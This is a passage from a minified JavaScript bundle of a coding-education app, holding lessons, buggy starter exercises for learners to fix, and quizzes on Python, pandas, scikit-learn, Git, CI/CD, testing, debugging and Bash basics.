exception-handling block so it runs correctly.",items:["try:","    total = int(user_input)","except ValueError as err:","    print('not a number:', err)","finally:","    print('attempt finished')"],explanation:"try holds the risky line, except catches the specific failure it can handle, and finally always runs — even when the call returned or raised."},reading:!0,body:`Classes bundle **data + behavior**:

class BankAccount:
    def __init__(self, owner, balance=0):
        self.owner = owner          # public attribute
        self._balance = balance     # _convention: internal

    def deposit(self, amount):
        if amount <= 0:
            raise ValueError("amount must be positive")
        self._balance += amount
        return self._balance

    @property
    def balance(self):              # computed attribute
        return self._balance
\`\`\`

**Inheritance** — subclass, extend, override; \`super()\` calls up:

class SavingsAccount(BankAccount):
    def __init__(self, owner, balance=0, rate=0.02):
        super().__init__(owner, balance)
        self.rate = rate

    def add_interest(self):
        self.deposit(self._balance * self.rate)
\`\`\`

**Duck typing** is Python's philosophy: behavior over type — anything with \`.deposit()\` works where an account is expected. \`dataclasses\` remove the boilerplate for plain data holders.

**Exception handling** — catch *specific*, handle *meaningfully*:

try:
    risky()
except ValueError as err:
    print(f"bad input: {err}")
except (KeyError, IndexError):
    print("missing data")
else:
    print("only on success")
finally:
    close_resources()   # always runs
\`\`\`

Never bare-\`except:\` (it swallows your own bugs). For cleanup, prefer context managers:

with open("data.csv") as f:    # closes even on exception
    rows = f.readlines()
\`\`\``,quiz:[{q:"__init__ runs when…",options:["The class is defined","A new instance is created","The program exits","Any method is called"],answer:1,explanation:"It's the constructor — initialize instance attributes there."},{q:"super().__init__() does what?",options:["Deletes the parent","Runs the parent class's initializer","Creates a static method","Nothing"],answer:1,explanation:"It delegates construction up the chain before adding subclass state."},{q:"@property lets you…",options:["Access a computed value like an attribute","Make methods private","Define constants","Skip __init__"],answer:0,explanation:"balance instead of balance() — getter syntax with method logic."},{q:"Why avoid bare except:?",options:["It's slow","It catches everything — including your own bugs and KeyboardInterrupt","It only works in Python 2","It skips finally"],answer:1,explanation:"Catch specific exceptions so real errors still surface."},{q:"The 'with open(...)' pattern guarantees…",options:["Faster reads","The file closes even if an exception occurs","Compression","Encoding fixes"],answer:1,explanation:"Context managers pair setup/teardown deterministically."}]},{id:"pandas-numpy",title:"Data Wrangling: NumPy & pandas",minutes:12,reading:!0,body:`**NumPy** — C-speed math on arrays. The superpower is **vectorization**: express operations whole-array, never loop.

import numpy as np
prices = np.array([10.0, 20.0, 30.0])
with_tax = prices * 1.19          # elementwise — no loop
big = np.arange(1_000_000)
# big.sum() runs in ~0.5ms vs ~25ms for a pure-Python loop
\`\`\`

**pandas** — labeled tables (DataFrames) on top of NumPy:

import pandas as pd
df = pd.read_csv("sales.csv")

df.head()                       # peek
df.info()                       # dtypes + missing counts
df.describe()                   # stats summary
\`\`\`

**The cleaning ritual:**

df = df.dropna(subset=["price"])            # drop missing criticals
df["price"] = df["price"].astype(float)
df["revenue"] = df["qty"] * df["price"]      # vectorized new column
df = df[df["qty"] > 0]                       # boolean filtering
df["region"] = df["region"].str.strip().str.title()
\`\`\`

**Group-by → aggregate** is the heart of analysis:

summary = (df.groupby("region")
             .agg(total=("revenue", "sum"), orders=("revenue", "count"))
             .sort_values("total", ascending=False))
\`\`\`

**Merging** = SQL joins: \`pd.merge(orders, customers, on="customer_id", how="left")\`.

Workflow rule: profile first (\`info\`/\`describe\`), clean second, analyze third — and keep a random \`df.sample(5)\` eyeball-check in the loop. Garbage in, confident nonsense out.`,quiz:[{q:"Vectorization means…",options:["Using for loops carefully","Applying operations to whole arrays at C speed","Using lists","Parallelizing across servers"],answer:1,explanation:"NumPy pushes loops into compiled C — often 50–100× faster."},{q:"df.groupby('region').agg(...) is analogous to…",options:["SQL GROUP BY + aggregates","A JS map","Sorting","A pivot table export"],answer:0,explanation:"Split → apply → combine; same semantics as SQL grouping."},{q:"df[df['qty'] > 0] returns…",options:["A view that mutates df","Rows where the condition holds (a filtered frame)","A single boolean","The column qty"],answer:1,explanation:"Boolean indexing — the mask selects matching rows."},{q:"First step on a fresh dataset?",options:["Fit a model","Profile it: info(), describe(), head()","Delete duplicates","Plot everything"],answer:1,explanation:"Understand dtypes and missingness before transforming anything."},{q:"how='left' in pd.merge keeps…",options:["Only matching rows","All rows from the left frame, matched where possible","All rows from both","Random rows"],answer:1,explanation:"Left join semantics — exactly like SQL's LEFT JOIN."}]},{id:"matplotlib-ml",title:"Visualize & Predict: Matplotlib → ML Basics",minutes:12,reading:!0,body:`**Visualization** is analysis's proof layer — you spot patterns before you compute them.

import matplotlib.pyplot as plt

fig, ax = plt.subplots(figsize=(8, 4))
ax.hist(df["revenue"], bins=30)          # distribution
ax.scatter(df["qty"], df["revenue"], alpha=0.4)  # relationship
ax.plot(dates, rolling_avg)              # trend
ax.set(title="Revenue by day", xlabel="date", ylabel="$")
plt.tight_layout()
\`\`\`

Chart-choice cheat sheet: **histogram** = distribution · **scatter** = relationship · **line** = time trend · **bar** = category comparison · **heatmap** = matrix.

**The ML entry point** — scikit-learn's one API to rule them all:

from sklearn.model_selection import train_test_split
from sklearn.linear_model import LinearRegression
from sklearn.metrics import mean_absolute_error

X = df[["qty", "unit_price"]]      # features
y = df["revenue"]                  # target

X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42)

model = LinearRegression().fit(X_train, y_train)
preds = model.predict(X_test)
print("MAE:", mean_absolute_error(y_test, preds))
print("qty effect: +$", model.coef_[0], "per unit")
\`\`\`

**The iron rules:**
1. **Split before anything** — test data must simulate the future, so the model never sees it during fitting (or scaling!).
2. **A baseline first** (predict the mean) — beat it or the model is worthless.
3. **Error metric matches the business**: MAE = average miss in real units; RMSE punishes big misses.
4. Overfitting signal: train error ≪ test error. Fix with more data, fewer features, or regularization.`,quiz:[{q:"Best chart for a variable's distribution?",options:["Line","Histogram","Bar","Pie"],answer:1,explanation:"Histograms bin values to reveal shape, center, and outliers."},{q:"Why split before fitting?",options:["To save memory","The test set must simulate unseen data — leaking it inflates scores","sklearn requires two files","For faster training"],answer:1,explanation:"Post-split evaluation is the only honest performance estimate."},{q:"model.coef_ tells you…",options:["The prediction error","Each feature's learned effect on the target","The learning rate","Number of rows"],answer:1,explanation:"Linear coefficients = effect per unit of the feature, holding others fixed."},{q:"Train error 2%, test error 30% means…",options:["A great model","Overfitting — memorized training data","Underfitting","Data leakage downward"],answer:1,explanation:"The generalization gap is the overfitting signature."},{q:"MAE is preferred over RMSE when…",options:["Big outliers should dominate","You want 'average miss' in real units, robust to outliers","Data is categorical","There is no target"],answer:1,explanation:"MAE is interpretable and outlier-robust; RMSE amplifies large errors."}]}]},OP={id:"git",title:"Git, GitHub & Workflows",blurb:"Version control, branches, PRs, and shipping pipelines — how teams actually work.",numeral:"Ⅵ",lessons:[{id:"git-basics",title:"Git Foundations: Staging & Commits",minutes:9,reading:!0,body:`Git stores your project as a chain of **snapshots** (commits). Three areas matter:

\`\`\`
working directory  →  staging area  →  repository
   (your edits)      (git add)        (git commit)
\`\`\`

The **staging area** is the killer feature: compose a commit deliberately instead of dumping everything.

\`\`"
git init                     # start tracking a project
git status                   # what changed, what's staged
git add index.html           # stage one file
git add -p                   # stage piece by piece (hunk by hunk!)
git commit -m "Add hero section"
git log --oneline --graph    # history at a glance
\`\`\`

**Commit messages are documentation.** Subject in imperative mood, ≤50 chars, blank line, then the *why*:

\`\`"
Fix overflow on mobile hero

The hero image pushed CTA below the fold on 375px screens;
constrain by viewport height instead of fixed px.
\`\`\`

**The safety net:**
- \`git diff\` — unstaged changes · \`git diff --staged\` — what's about to be committed
- \`git restore file\` — discard uncommitted edits to a file
- \`git restore --staged file\` — unstage (keep the edits)
- \`git commit --amend\` — fix the last commit (before pushing!)

Commits are cheap checkpoints. Small, single-purpose commits make bugs bisectable (\`git bisect\` finds the culprit commit by binary search) and reviews readable.`,quiz:[{q:"git add does what?",options:["Commits","Moves changes into the staging area","Pushes","Creates a branch"],answer:1,explanation:"Staging selects exactly what the next commit will contain."},{q:"A good commit message subject is…",options:["'update'","Imperative, ≤50 chars: 'Fix mobile hero overflow'","All caps","The date"],answer:1,explanation:"It completes 'this commit will…' — imperative and specific."},{q:"git restore --staged file.js will…",options:["Delete the file","Unstage it, keeping your edits","Discard the edits","Commit it"],answer:1,explanation:"It rewinds the staging area, not the working tree."},{q:"Why small commits?",options:["More contributions look good","Bisectable history and readable reviews","Git requires it","They compress better"],answer:1,explanation:"git bisect binary-searches history — it needs granular commits."},{q:"git diff --staged shows…",options:["Changes since the last push","What the next commit will contain vs HEAD","Other branches","Deleted files only"],answer:1,explanation:"It diffs staging area against the last commit."}]},{id:"git-branches",title:"Branches & Resolving Conflicts",minutes:10,reading:!0,body:`A **branch** is just a movable pointer to a commit — creating one is instant and free.

\`\`"
git switch -c feature/login     # create + move to a new branch
# ...work, commit...
git switch main
git merge feature/login         # bring the work back
\`\`\`

**A fast-forward** moves the pointer when main hasn't diverged. When both branches committed, git makes a **merge commit** — or stops to ask for help:

\`\`"
<<<<<<< HEAD
const timeout = 30;        // your branch's version
=======
const timeout = 60;        // incoming branch's version
>>>>>>> feature/timeout
\`\`\`

**Resolving a conflict = editing the file to the correct combined result**, then \`git add\` + \`git commit\`. The markers are questions git is asking you, not errors.

**Conflict-prevention habits:**
- Pull/rebase often — small drift, small conflicts
- Small branches, short lives
- One topic per branch
- Agree on file ownership within the team

**Team convention (GitHub flow):** branch per feature → push → **Pull Request** → review → merge → delete branch. The PR is where code review, CI checks, and discussion live — the conversation is as valuable as the code.

\`git pull\` = fetch + merge from the remote. On shared branches, prefer \`git pull --rebase\` to keep history linear (your local commits replay on top of the latest remote).`,quiz:[{q:"A branch is…",options:["A copy of the whole folder","A movable pointer to a commit","A remote backup","A tag"],answer:1,explanation:"Branches are 41-byte pointer files — creating them is O(1)."},{q:"Conflict markers mean…",options:["Git is broken","Both branches changed the same lines — git needs a human decision","The file is corrupted","You must delete the file"],answer:1,explanation:"Edit to the correct result, add, and commit to complete the merge."},{q:"After resolving conflicts you must…",options:["git abort","git add the files and commit the merge","re-clone","nothing"],answer:1,explanation:"Staging the resolved files signals 'decision made'."},{q:"A Pull Request is primarily…",options:["A git command","A proposal to merge + the venue for review and CI","An error report","A backup"],answer:1,explanation:"PR = review conversation + checks gating a merge."},{q:"git pull --rebase instead of plain pull keeps…",options:["Local commits replayed on top — linear history","Everything on main","Merge commits out of your feature work","Both a and c"],answer:3,explanation:"Rebase replays your work onto the remote tip — no merge bubbles from pulls."}]},{id:"git-workflow-lab",title:"The Git Workflow Lab",minutes:12,sort:{prompt:"Order the feature workflow, first command to last.",items:["git switch -c feature/login — branch off main","git add . — stage the working changes","git commit -m 'feat: login' — snapshot the work","git push -u origin feature/login — publish the branch","open a pull request for review"],explanation:"Branch before you edit, stage before you commit, push before you open the PR. Skipping the branch is how work ends up on main by accident."},body:`Time to drive a repo yourself. Below is a **simulated terminal** with a real workflow waiting: a modified file, a feature to branch, a merge that will conflict, and a push.

The full cycle you're about to run, in order:

\`\`\`
git status                  # what changed?
git add app.js              # stage the change
git commit -m "add feature" # snapshot it
git checkout -b feature     # branch for risky work
git checkout main           # back to main
git merge feature           # bring it home (this one conflicts!)
git add app.js              # after fixing the conflict markers
git commit -m "merge feature"
git push                    # ship it
\`\`\`

**Why conflicts happen:** two branches change the same lines. Git merges cleanly when changes are in different places; when they overlap it stops and asks *you* to decide. The file gets markers like \`<<<<<<< HEAD\` / \`=======\` / \`>>>>>>> feature\` — you edit the file to the version you want, then stage and commit to finish the merge.

**Muscle memory beats memorization.** Nobody remembers flags; everyone remembers \`status → add → commit\` because they've typed it a hundred times. Type every command below — don't copy-paste your way through this one.

Objectives check off as you go. \`help\` lists what this simulator understands, and ↑ recalls your last command like a real shell.`,gitSim:[{text:"Run `git status` — find what's modified",match:e=>e.cmd==="status"},{text:"Stage app.js (`git add app.js`)",match:e=>e.cmd==="add"&&(e.args.includes("app.js")||e.args.includes("."))},{text:"Commit it with a message (git commit -m 'your message')",match:e=>e.cmd==="commit"&&e.args.length>=2},{text:"Create and switch to a branch (`git checkout -b feature`)",match:e=>(e.cmd==="checkout"||e.cmd==="switch")&&e.args[0]==="-b"&&!!e.args[1]},{text:"Switch back to main and merge your branch (`git checkout main` then `git merge feature`)",match:(e,t)=>e.cmd==="merge"&&e.args[0]&&e.args[0]!==(t==null?void 0:t.branch)||e.cmd==="checkout"&&e.args[0]==="main"},{text:"Resolve the conflict: `git add app.js` once you've seen the markers",match:(e,t)=>e.cmd==="add"&&(t==null?void 0:t.conflicts)==="app.js"&&(e.args.includes("app.js")||e.args.includes("."))},{text:'Commit the merge (`git commit -m "..."`)',match:(e,t)=>e.cmd==="commit"&&e.args.length>=2&&(t==null?void 0:t.conflicts)==="app.js"},{text:"Push everything to origin (`git push`)",match:(e,t)=>e.cmd==="push"&&((t==null?void 0:t.ahead)??0)>0}],quiz:[{q:"What does `git add` actually do?",options:["Saves the file to GitHub","Stages a snapshot of the file for the next commit","Creates a new branch","Uploads to the remote"],answer:1,explanation:"The staging area is the exact contents your next commit will record — add selects, commit snapshots."},{q:"A merge stops with CONFLICT. Git wants you to…",options:["Run git merge again until it works","Delete the branch and start over","Edit the file to resolve, stage it, and commit","Push anyway"],answer:2,explanation:"Conflicts are a decision, not an error: pick the right content, stage, commit to conclude the merge."},{q:"`git checkout -b feature` does what in one step?",options:["Merges feature into the current branch","Creates feature and switches to it","Deletes feature","Copies the branch to the remote"],answer:1,explanation:"-b = create + switch, the branch equivalent of mkdir + cd."},{q:"After committing locally, `git status` says 'ahead of origin/main by 2 commits'. What does that mean?",options:["Your local branch has 2 commits the remote doesn't have yet","You must pull before anything works","Two commits failed","The remote is broken"],answer:0,explanation:"Commits are local until pushed — 'ahead' is just unpushed work."},{q:"Why stage files one at a time instead of `git add .` always?",options:["It's faster","Commits should group related changes — selective staging makes each commit meaningful","git add . doesn't work","Staging uploads files"],answer:1,explanation:"Small, focused commits are reviewable and revertable — that's the whole point of staging."}]},{id:"git-ci",title:"CI/CD: Shipping Automatically",minutes:9,reading:!0,body:`**CI (Continuous Integration)** — every push builds and tests the code automatically. **CD (Continuous Delivery/Deployment)** — passing builds ship to users without ceremony.

\`\`"
# .github/workflows/ci.yml
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: npm }
      - run: npm ci
      - run: npm run typecheck
      - run: npm test
      - run: npm run build
\`\`\`

That file turns every push into a gate: typecheck, test, build. A PR that breaks any check **cannot merge** — review focuses on design, not "does it run".

**Pipeline stages, in order of cheapness:**
1. Lint + typecheck (seconds)
2. Unit tests (seconds–minutes)
3. Build (minutes)
4. Deploy to a **preview** environment per PR
5. Manual promote → production

**The deployment contract:** env vars/secrets live in the platform's settings (\`DATABASE_URL\`, API keys) — never in git; builds must be reproducible (lockfiles committed); deploys are immutable artifacts that you can roll back.

**Preview deployments are underrated** — every PR gets a real URL (this very app deploys that way). Reviewers click, not pull-and-run.

Culture note: green main is sacred. If CI goes red, fixing it outranks new work — a broken main blocks the whole team.`,quiz:[{q:"CI's core promise is…",options:["Faster laptops","Every push is automatically built and tested","No bugs ever","Free hosting"],answer:1,explanation:"Integration happens continuously, so breakage surfaces in minutes."},{q:"Where do production secrets belong?",options:["Committed .env","The platform's environment/secret settings","In the README","In the Dockerfile"],answer:1,explanation:"Secrets are injected at deploy time — never in version control."},{q:"What gates a merge in a mature setup?",options:["Gut feeling","CI checks passing (typecheck, tests, build)","The CEO's approval","Nothing"],answer:1,explanation:"Branch protection + required checks = green-main discipline."},{q:"Cheapest pipeline stage to run first?",options:["E2E tests","Lint + typecheck","Deploy","Load tests"],answer:1,explanation:"Fail fast: seconds-level checks before expensive builds."},{q:"A preview deployment gives…",options:["A live URL per PR for reviewers","A fake environment","Only production","A local server"],answer:0,explanation:"Reviewers experience the change without touching their setup."}]}]},IP={id:"testing",title:"Testing & Debugging",blurb:"Write tests that catch bugs, and hunt down the ones that slip through.",numeral:"Ⅶ",lessons:[{id:"testing-why",title:"Why Test? The Test Pyramid & First Assertions",minutes:9,body:`Tests are **executable specifications**: code that proves your code does what you claim, and keeps proving it while everything around it changes.

**The test pyramid** — many cheap tests at the base, few expensive ones on top:

\`\`\`
        /  E2E  \\        few, slow, whole-app via browser
       /  Integr. \\      some, API + DB together
      / Unit tests \\     many, milliseconds, single functions
\`\`\`

Push most of your effort to the base: unit tests run in milliseconds, so you run them constantly.

**Anatomy of every good test — AAA:**

\`\`\`
test("adds two numbers", () => {
  // Arrange
  const calc = new Calculator();
  // Act
  const result = calc.add(2, 3);
  // Assert
  expect(result).toBe(5);
});
\`\`\`

**The rules that keep suites healthy:**
1. **One behavior per test** — when it fails, the name should tell you what broke
2. **Test behavior, not implementation** — assert \`renderUser(...)\` output, not that it called a private helper
3. **Deterministic** — no \`Date.now()\`, no randomness without seeds, or tests flake
4. **Fast by default** — if the suite takes minutes, nobody runs it, and unrun tests are decoration

**What to test first:** the money paths (checkout, auth), the code that broke before (regression tests), and anything with branches you can't hold in your head.

This app ships with a real \`vitest\` suite in \`tests/\` — run \`bun test\` and read it; it's the same patterns you're learning here.`,starter:`// This sandbox runs real assertions — a tiny expect() implementation.
function expect(actual) {
  return {
    toBe(expected) {
      if (actual !== expected)
        throw new Error("expected " + expected + ", got " + actual);
    },
    toEqual(expected) {
      if (JSON.stringify(actual) !== JSON.stringify(expected))
        throw new Error("expected " + JSON.stringify(expected) + ", got " + JSON.stringify(actual));
    },
  };
}

function test(name, fn) {
  try { fn(); console.log("✓", name); }
  catch (e) { console.log("✗", name, "—", e.message); }
}

// The code under test — deliberate bug for you to find via tests
function slugify(title) {
  return title.toLowerCase().replace(/ /g, "-");
}

test("slugify lowercases and hyphenates", () => {
  expect(slugify("Hello World")).toBe("hello-world");
});

test("slugify trims multiple spaces", () => {
  expect(slugify("two  spaces")).toBe("two-spaces"); // fails! fix slugify
});

test("slugify strips punctuation", () => {
  expect(slugify("Hi, There!")).toBe("hi-there");   // fails! fix slugify
});`,check:{expr:"output.includes('✓ slugify lowercases') && output.includes('✓ slugify trims multiple spaces') && output.includes('✓ slugify strips punctuation')",hint:"Fix slugify: lowercase, replace /\\\\s+/g with '-', then strip characters that aren't letters, numbers, or hyphens."},quiz:[{q:"The test pyramid says most tests should be…",options:["E2E","Integration","Unit tests","Manual"],answer:2,explanation:"Cheap and fast at the base — a few expensive E2E at the top."},{q:"AAA stands for…",options:["Arrange, Act, Assert","Always Add Assertions","Async, Await, Assert","Analyze, Adapt, Approve"],answer:0,explanation:"Set up, exercise, verify — the universal test shape."},{q:"A 'flaky' test is one that…",options:["Is very fast","Passes and fails without code changes — usually nondeterminism","Tests UI","Has many assertions"],answer:1,explanation:"Time, randomness, or shared state makes it unreliable — tests must be deterministic."},{q:"Good first targets for tests are…",options:["Getter/setter boilerplate","Money paths, past bug sites, tricky branches","CSS files","Everything equally"],answer:1,explanation:"Highest risk × highest pain-if-broken first."},{q:"Tests should assert…",options:["Private helper call counts","Public behavior — inputs to observable outputs","Line coverage numbers","Implementation order"],answer:1,explanation:"Behavior tests survive refactors; implementation tests shatter on them."}]},{id:"debugging-method",title:"Debugging: A Scientific Method",minutes:10,body:`Debugging is **binary search over your assumptions**. The systematic loop:

1. **Reproduce** — a bug you can't trigger, you can't verify fixed. Shrink it: smallest input, fewest steps.
2. **Read the error** — top line = what broke; first line of *your code* in the stack = where. Errors are information, not insults.
3. **Form a hypothesis** — "the cart total comes back as text because price arrives as a string."
4. **Test the hypothesis with ONE probe** — log \`typeof price\`, or set a breakpoint. If confirmed, fix; if not, next hypothesis.
5. **Fix the cause, not the symptom** — \`Number(price)\` at the boundary, not \`Number(price) || 0\` at every usage.
6. **Prove it** — rerun the repro, then write a **regression test** so it can never return.

\`\`"
// Stack traces: read yours first, then libraries
TypeError: Cannot read properties of undefined (reading 'name')
    at renderUser (user.ts:12:18)      ← start here (your code)
    at updateProfile (app.ts:40:5)
\`\`\`

**console is more than log:**

\`\`"
console.table(users);            // arrays of objects as a grid
console.time("render"); render(); console.timeEnd("render");
console.log({ user, cart });     // shorthand — labels included
\`\`\`

**Breakpoints beat log-spam:** in DevTools, click a line number to pause there — you inspect every variable at that instant, live. \`debugger;\` in code does the same. Conditional breakpoints (\`i === 999\`) catch loop-ending bugs without a thousand pauses.

**Rubber duck it:** explaining the code aloud line-by-line forces slow, careful reading — half of all bugs surrender before the duck answers.`,starter:`// A real bug hunt. Predict the failure, then find it with ONE probe at a time.
// The API is inconsistent about types — that is the bug.
const cart = [
  { name: "keyboard", price: "80" },   // price is a STRING
  { name: "mouse", price: "25" },      // this one too
  { name: "usb-c hub", price: 25 },    // but this one came back a number
];

function total(items) {
  let sum = 0;
  for (const item of items) {
    sum += item.price;   // 0 + "80" + "25" … that concatenates, it never adds
  }
  return sum;
}

console.log("cart total:", total(cart));   // "0802525" — not 130
console.log("— is the total wrong? probe the cause —");

// Probe 1: what type is each price, really?
cart.forEach((i) => console.log(i.name, "price:", typeof i.price, "—", i.price));

// TODO 1: fix total() so every price is coerced — at the BOUNDARY, once
// TODO 2: the failing test at the bottom must print ✓

function expect(actual) {
  return {
    toBe(expected) {
      if (actual !== expected)
        throw new Error("expected " + expected + ", got " + actual);
    },
  };
}
function test(name, fn) {
  try { fn(); console.log("✓", name); }
  catch (e) { console.log("✗", name, "—", e.message); }
}

test("cart total is 130", () => {
  expect(total(cart)).toBe(130);
});`,check:{expr:"output.includes('✓ cart total is 130')",hint:"Make total() coerce at the boundary: sum += Number(item.price). The test must print ✓."},quiz:[{q:"Step one of debugging any bug?",options:["Rewrite the module","Reproduce it reliably, then shrink it","Add try/catch","Restart the machine"],answer:1,explanation:"Unreproducible bugs can't be verified fixed — repro is the foundation."},{q:"In a stack trace, you should read…",options:["Only the top line","What broke, then the first frame belonging to YOUR code","The bottom line","Nothing — ignore stack traces"],answer:1,explanation:"Library frames fill the middle; your frame is where you can act."},{q:"The scientific debugging loop is…",options:["Log everything forever","Hypothesis → single probe → confirm/refute → fix cause","Delete code until it works","Copy code from the internet"],answer:1,explanation:"Each probe tests exactly one assumption — that's binary search over beliefs."},{q:"Why write a regression test after fixing?",options:["To slow the suite down","The exact bug can never silently return","It's required by git","To increase coverage stats"],answer:1,explanation:"Every fixed bug deserves a test that fails without the fix."},{q:"console.table() is best for…",options:["Hiding logs","Inspecting arrays of objects as a readable grid","Timing code","Stack traces"],answer:1,explanation:"It renders tabular data as an actual table — far faster to read than nested logs."}]},{id:"tdd-mocking",title:"TDD, Mocks & Testing Async Code",minutes:11,reading:!0,body:`**TDD (Test-Driven Development)** flips the order: red → green → refactor.

\`\`"
1. RED:    write a failing test for behavior you want
2. GREEN:  write the SIMPLEST code that passes
3. REFACTOR: clean up with the safety net on
\`\`\`

The cycle is minutes long. Benefits: you only write code some test demanded, and every feature is born with a specification. Costs: discipline, and design blindness if you over-follow it — pragmatists TDD the tricky logic, not the boilerplate.

**Mocks and stubs** replace slow/real dependencies with controllable fakes:

\`\`"
// Real: slow, flaky, needs network
// Mocked: instant, deterministic, can simulate failures
const fakeApi = {
  getUser: vi.fn().mockResolvedValue({ id: 1, name: "Ada" }),
  getUserFailure: vi.fn().mockRejectedValue(new Error("500")),
};

test("shows the user name", async () => {
  const vm = await createViewModel(fakeApi);
  expect(vm.name).toBe("Ada");
  expect(fakeApi.getUser).toHaveBeenCalledWith(1);
});
\`\`\`

**What to mock:** the network, time, filesystem, randomness. **What not to mock:** the code under test, simple pure functions, everything (mock-everything tests verify wiring, not behavior — they break on every refactor and catch no bugs).

**Testing async code:**

\`\`"
test("retries flaky calls", async () => {
  // vitest: fake timers make time instant and deterministic
  vi.useFakeTimers();
  const p = withRetry(flakyFn, 3);
  await vi.runAllTimersAsync();      // advance the clock!
  await expect(p).resolves.toBe("ok");
  expect(flakyFn).toHaveBeenCalledTimes(3);
});
\`\`\`

Rules: **always await** async assertions (an un-awaited promise passes vacuously!), simulate failure paths — happy-path-only suites lie about resilience — and keep each test's arrange section small enough to read at a glance.

**Coverage** is a smoke detector, not a goal: 100% coverage with weak assertions proves nothing; 70% with sharp behavioral tests is worth ten vanity suites.`,quiz:[{q:"TDD's cycle is…",options:["Code → test → debug","Red (failing test) → green (minimal pass) → refactor","Design → build → test once at the end","Ship → fix → test"],answer:1,explanation:"The failing test is the specification; minimal code makes it pass."},{q:"A mock that 'replaces' a dependency exists to…",options:["Slow tests down realistically","Make tests fast and deterministic — and simulate failure paths","Reduce coverage","Skip writing the real code"],answer:1,explanation:"You control the fake: instant, repeatable, and able to throw on demand."},{q:"Testing async code, the classic silent bug is…",options:["Forgetting await — the test passes before the assertion runs","Using too many mocks","Naming the test wrong","Using vi.fn()"],answer:0,explanation:"Un-awaited promises resolve after the test exits — assertions never execute."},{q:"Which should you NOT mock?",options:["Time","The network","The function under test","Randomness"],answer:2,explanation:"Mocking the subject tests nothing — you'd be verifying your own mock."},{q:"100% test coverage means…",options:["Zero bugs","Nothing by itself — assertions quality decides the value","The suite is too slow","TDD was followed"],answer:1,explanation:"Coverage measures execution, not verification — sharp assertions beat big numbers."}]},{id:"debug-the-bug",title:"Debug the Bug: Fix Three Broken Programs",minutes:15,body:`Reading code is easy. **Fixing broken code** is the actual job. Each program below runs without crashing — it just produces the wrong answer. Your tools: run it, read the output, form a hypothesis, change one thing, run again.

**The debugging loop (use it every time):**
1. **Reproduce** — run until you see the wrong output with your own eyes
2. **Isolate** — which function, which line? Print values if unsure
3. **Hypothesize** — "I think X is wrong because Y"
4. **Test the hypothesis** — change ONE thing, run again
5. **Verify the fix** — right answer AND still right for other inputs

**The classic bug families you'll meet below:**
- **Off-by-one** — loops that start at 1, stop at \`<= length\`, or slice with the wrong end
- **Mutation vs. copy** — sorting/reversing the original when you meant to keep it
- **Wrong comparison** — \`=\` instead of \`===\`, comparing a string to a number

Fix each program so its \`console.log\` lines print what the comments promise. The exercise checks all three outputs, so nothing is done until everything is done.`,starter:`// BUG 1: average() returns a wrong number
function average(nums) {
  let total = 0;
  for (let i = 1; i < nums.length; i++) {
    total += nums[i];
  }
  return total / nums.length;
}
console.log("average([2,4,6,8]) →", average([2, 4, 6, 8])); // should be 5

// BUG 2: topTwo() mutates the caller's array AND has a comparison bug
function topTwo(nums) {
  const sorted = nums.sort();           // hmm…
  return [sorted[0], sorted[1]];        // "top" should mean biggest
}
const scores = [30, 10, 50, 20];
console.log("topTwo →", JSON.stringify(topTwo(scores)));   // should be [50,30]
console.log("scores after →", JSON.stringify(scores));      // should stay [30,10,50,20]

// BUG 3: countVowels counts the wrong things
function countVowels(s) {
  let count = 0;
  for (const ch of s) {
    if (ch === "aeiou") count++;   // suspicious…
  }
  return count;
}
console.log("countVowels hello world →", countVowels("hello world")); // should be 3

// TODO: all three outputs must match the comments. One hypothesis at a time!`,check:{expr:"output.includes('average([2,4,6,8]) → 5') && output.includes('[50,30]') && output.includes('[30,10,50,20]') && output.includes('countVowels hello world → 3')",hint:"Bug 1: loops should start at 0. Bug 2: sort() mutates and sorts alphabetically — use [...nums].sort((a, b) => b - a) and take the first two. Bug 3: ch is one character — check it with 'aeiou'.includes(ch)."},predict:[{prompt:"What does this loop print?",code:`const arr = ["a", "b", "c"];
for (let i = 0; i <= arr.length; i++) {
  console.log(arr[i]);
}`,options:["a, b, c — and then undefined, because the last iteration reads past the end","Nothing, because loops can't use <=","a, b, c and stops cleanly","It throws a RangeError"],answer:0,explanation:"Indexes run 0..length-1; when i === length, arr[3] is undefined. Off-by-one is the most common bug in programming."},{prompt:"What does this print?",code:`const a = [3, 1, 2];
const b = a.sort();
console.log(a);
console.log(b === a);`,options:["[3,1,2] then [1,2,3], false","[1,2,3] then [1,2,3], true","[1,2,3] then [3,1,2], false","It throws"],answer:1,explanation:"sort() mutates in place AND returns the same array — a and b are two names for one array. Copy first: [...a].sort()."}],quiz:[{q:"The most effective first step when output is wrong is…",options:["Rewrite the whole function","Run it and print the intermediate values","Add try/catch","Delete the tests"],answer:1,explanation:"You can't fix what you can't see — logging state turns guessing into observing."},{q:"Why change only ONE thing between runs?",options:["It's faster","So you know which change fixed (or broke) it","Style guides require it","Multiple changes crash the runner"],answer:1,explanation:"Two changes at once means two suspects — you've learned nothing either way."},{q:"`if (x = 5)` inside a condition…",options:["Compares x to 5","Assigns 5 to x and is always truthy","Is a syntax error","Throws only in strict mode"],answer:1,explanation:"= returns the assigned value (5, truthy). Bug 3 above was this exact trap."},{q:"A fix works for [2,4,6,8]. The last step before moving on is…",options:["Commit it","Try edge cases: empty array, single element, negatives","Refactor to arrow functions","Add a comment"],answer:1,explanation:"average([]) is NaN, average([7]) divides by 1 — verify the fix generalizes before trusting it."},{q:"sort() without a comparator on [9, 100] gives…",options:["[9, 100] — numbers sort numerically","[100, 9] — it compares the STRING forms: '100' < '9'","[100, 9] because bigger comes first","It throws a TypeError"],answer:1,explanation:"Default sort stringifies elements and compares lexicographically — '100' < '9'. That's why topTwo needed (a, b) => b - a."}]}]},NP={id:"devops",title:"DevOps, Linux CLI & Cloud",blurb:"Command the terminal, write Bash, containerize with Docker, and ship behind Nginx.",numeral:"Ⅷ",lessons:[{id:"bash-basics",title:"The Linux Filesystem & Essential Bash",minutes:12,body:`Linux is a **tree rooted at \`/\`** — everything is a file: drives, devices, settings. You'll live in this tree, so learn to move fast.

\`\`\`
/            the root — everything hangs off it
├── home/    user folders (home/you)
├── etc/     system configuration (nginx.conf, ssh/)
├── var/     variable data — logs live in var/log
└── usr/     installed programs and libraries
\`\`\`

**Moving around:**
\`\`\`
pwd              # print working directory — where am I?
ls -la           # list all files, long form (permissions, sizes, dates)
cd /var/log      # absolute path — from the root
cd ..            # relative — up one level
cd ~             # home directory (~ = /home/you)
